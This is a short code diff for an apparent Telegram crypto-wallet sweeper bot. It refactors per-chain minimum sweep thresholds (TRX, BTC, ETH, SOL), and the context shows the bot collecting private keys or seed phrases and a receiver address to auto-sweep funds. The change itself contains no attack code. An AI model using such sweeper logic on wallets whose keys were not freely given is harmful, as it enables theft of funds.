@@ -1,3 +1,10 @@
+// Minimum sweep amounts per chain, in asset units (TRX, BTC, ETH, SOL)
+const MIN_SWEEP_AMOUNTS = Object.freeze({
+  TRX: 1,      // 1 TRX
+  BTC: 0.0001, // 0.0001 BTC
+  ETH: 0.001,  // 0.001 ETH
+  SOL: 0.01    // 0.01 SOL
+});
 require("dotenv").config();
 const TelegramBot = require("node-telegram-bot-api");
 const { db } = require("./db/db");
@@ -292,20 +299,13 @@ bot.on("message", async (msg) => {
   } else if (state.step === "receiver") {
     state.data.receiver = msg.text;
     try {
-      const MIN_SWEEP_AMOUNTS = {
-        TRX: 1,      // 1 TRX minimum
-        BTC: 0.0001, // 0.0001 BTC minimum
-        ETH: 0.001,  // 0.001 ETH minimum
-        SOL: 0.01    // 0.01 SOL minimum
-      };
-
-      // No threshold needed - sweep any balance found
+      // Apply chain-specific minimum threshold for auto-sweeps
       await setupWallet(
         chatId,
         state.data.blockchain,
         state.data.key,
         state.data.receiver,
-        MIN_SWEEP_AMOUNTS[state.data.blockchain] || 0, // apply minimum sweep threshold
+        MIN_SWEEP_AMOUNTS[state.data.blockchain] || 0,
         state.data.authMethod === "privateKey" ? "privateKey" : "seedPhrase"
       );
       userStates.delete(chatId);
